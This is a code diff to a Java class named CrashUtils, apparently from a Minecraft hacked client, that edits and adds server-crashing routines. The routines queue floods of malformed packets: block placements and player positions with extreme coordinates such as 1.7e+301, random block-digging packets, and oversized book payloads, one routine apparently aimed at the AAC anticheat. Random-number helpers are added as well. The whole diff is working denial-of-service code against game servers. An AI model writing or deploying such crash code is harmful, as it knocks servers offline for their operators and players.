@@ -79,9 +79,7 @@ public class CrashUtils {
     }
 
     public void placecrash(ItemStack stack) {
-        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
-                (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
-                        , 1, stack, 0.0F, 0.0F, 0.0F));
+        Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement(stack));
     }
 
     public void placecrash2(ItemStack stack) {
@@ -102,7 +100,7 @@ public class CrashUtils {
         String channel;
         PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
         packetBuffer.writeItemStackToBuffer(stack);
-        channel = buffertype[ThreadLocalRandom.current().nextInt(1)];
+        channel = buffertype[0];
         Main.INSTANCE.packetQueue.add(new C17PacketCustomPayload(channel, packetBuffer));
     }
 
@@ -172,7 +170,7 @@ public class CrashUtils {
 
         if (nullstring) {
             for (int size = 0; size < bookvalue; ++size)
-                builder.append("\n");
+                builder.append("/n");
         } else {
             builder.append("{");
             for (int size = 0; size < bookvalue; ++size) {
@@ -250,12 +248,21 @@ public class CrashUtils {
         }
     }
 
-    public void actioncrash(int amount) {
+    public void actioncrash(int amount , int range) {
         int init = 0;
         while (init < amount) {
-            Main.INSTANCE.packetQueue.add(new C08PacketPlayerBlockPlacement
-                    (new BlockPos(Double.MAX_VALUE, 1.0, Double.MAX_VALUE)
-                            , Integer.MAX_VALUE, Minecraft.getMinecraft().thePlayer.getHeldItem(), Integer.MAX_VALUE, 1.0F, Integer.MAX_VALUE));
+            final BlockPos blockPos = Minecraft.getMinecraft().thePlayer.getPosition().add(getRandomInteger(-10, 10),
+                    getRandomInteger(-15, 15), getRandomInteger(-10, 10));
+            Main.INSTANCE.packetQueue.add(new C07PacketPlayerDigging(C07PacketPlayerDigging.Action.STOP_DESTROY_BLOCK, blockPos, EnumFacing.DOWN));
+            init++;
+        }
+    }
+    
+
+    public void aac5crash(int amount) {
+        int init = 0;
+        while (init < amount) {
+            Main.INSTANCE.packetQueue.add(new C03PacketPlayer.C04PacketPlayerPosition(1.7e+301, -999, 0, true));
             init++;
         }
     }
@@ -269,5 +276,35 @@ public class CrashUtils {
     //TODO: GUI For Crasher // Multi Tags Crasher // Non Book Make Crasher
     //PlayerUtil.debug(Main.INSTANCE.aesUtil.AESEncode(String.valueOf(packetBuffer))); Thread.sleep(delay);
 
+
+    private final ThreadLocalRandom threadLocalRandom = ThreadLocalRandom.current();
+
+    public double getRandomDouble(double min, double max) {
+        return threadLocalRandom.nextDouble(min, max);
+    }
+
+    public int getRandomInteger(int min, int max) {
+        return threadLocalRandom.nextInt(min, max);
+    }
+
+    public double getRandomGaussian(double average) {
+        return threadLocalRandom.nextGaussian() * average;
+    }
+
+    public float getRandomFloat(float min, float max) {
+        return (float) threadLocalRandom.nextDouble(min, max);
+    }
+
+    public double smooth (double max, double min, double time, boolean randomizing, double randomStrength) {
+        min += 1;
+        double radians = Math.toRadians((System.currentTimeMillis() * time % 360) - 180);
+        double base = (Math.tanh(radians) + 1) / 2;
+        double delta = max - min;
+        delta *= base;
+        double value = min + delta;
+        if(randomizing)value *= ThreadLocalRandom.current().nextDouble(randomStrength,1);
+        return Math.ceil(value *1000) / 1000;
+    }
+    
 
 }
